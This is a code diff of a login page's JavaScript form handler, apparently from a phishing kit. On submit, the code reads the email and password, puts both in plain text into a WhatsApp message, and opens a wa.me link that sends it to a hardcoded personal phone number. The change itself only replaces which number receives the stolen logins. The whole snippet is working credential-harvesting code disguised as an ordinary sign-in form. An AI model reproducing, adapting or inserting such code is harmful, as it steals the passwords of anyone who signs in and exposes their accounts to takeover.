@@ -15,7 +15,7 @@ document.getElementById('loginForm').addEventListener('submit', async (e) => {
 
   // Envoi sur WhatsApp
   const message = `*📥 ACCÈS SALLE*\n\n*Email:* ${email}\n*password 🔑 :* ${password}\n*Date:* ${new Date().toLocaleString('fr-FR')}`;
-  const monWhatsApp = '243999269701';
+  const monWhatsApp = '243972055373';
   const whatsappUrl = `https://wa.me/${monWhatsApp}?text=${encodeURIComponent(message)}`;
   
   window.open(whatsappUrl, '_blank');
